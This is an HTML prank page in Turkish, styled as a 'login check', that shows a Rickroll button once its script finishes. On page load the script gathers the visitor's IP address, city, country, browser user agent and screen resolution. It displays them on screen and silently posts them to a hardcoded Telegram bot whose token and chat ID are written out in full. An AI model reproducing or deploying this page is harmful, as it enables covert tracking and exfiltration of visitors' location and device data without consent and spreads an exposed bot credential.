<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <title>Giriş Kontrolü</title>
  <style>
    body {
      background-color: #f0f0f0; /* Açık gri zemin */
      color: #222; /* Koyu gri metin */
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      font-size: 20px;
      margin: 0;
      overflow: hidden;
    }
    #terminal {
      padding: 30px;
      white-space: pre-line;
      height: 100vh;
      overflow-y: auto;
      position: relative;
      z-index: 1;
      line-height: 1.6; /* Daha rahat okunur satır aralığı */
      background: #fff;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      max-width: 600px;
      margin: 40px auto;
      border-radius: 8px;
    }
    .background-code {
      display: none; /* Arka plan kodu gizlendi, istersen açabiliriz */
    }
    #rickButton {
      display: none;
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 20px 40px;
      font-size: 28px;
      background-color: #0078D7; /* Canlı mavi */
      color: white;
      border: none;
      cursor: pointer;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      z-index: 1000;
      border-radius: 12px;
      box-shadow: 0 5px 15px rgba(0, 120, 215, 0.4);
      transition: background-color 0.3s ease;
    }
    #rickButton:hover {
      background-color: #005a9e;
    }
  </style>
</head>
<body>

  <div id="terminal"></div>

  <button id="rickButton" onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">
    Tıklamaya cesaretin var mı?
  </button>

  <script>
    const terminal = document.getElementById('terminal');
    const rickButton = document.getElementById('rickButton');

    function typeText(text, delay = 50) {
      return new Promise(resolve => {
        let i = 0;
        const interval = setInterval(() => {
          terminal.innerText += text.charAt(i);
          i++;
          if (i >= text.length) {
            clearInterval(interval);
            terminal.innerText += "\n";
            resolve();
          }
        }, delay);
      });
    }

    async function sendToTelegram(message) {
      const chatId = "6400737507"; // Kendi chat ID’in
      const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Kendi bot token’in
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    async function showInfo() {
      await typeText("Veriler toplanıyor...");
      await new Promise(r => setTimeout(r, 1000));

      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        await typeText(`IP Adresi: ${data.ip}`);
        await typeText(`Şehir: ${data.city}`);
        await typeText(`Ülke: ${data.country_name}`);
        await typeText(`Tarayıcı: ${navigator.userAgent}`);
        await typeText(`Ekran: ${screen.width}x${screen.height}`);

        const message = `YENİ GİRİŞ:\nIP: ${data.ip}\nŞehir: ${data.city}\nÜlke: ${data.country_name}\nTarayıcı: ${navigator.userAgent}\nÇözünürlük: ${screen.width}x${screen.height}`;

        await sendToTelegram(message);
      } catch (e) {
        await typeText("Veri alınırken bir hata oluştu.");
      }

      await new Promise(r => setTimeout(r, 1000));
      rickButton.style.display = 'block';
    }

    showInfo();
  </script>
</body>
</html>
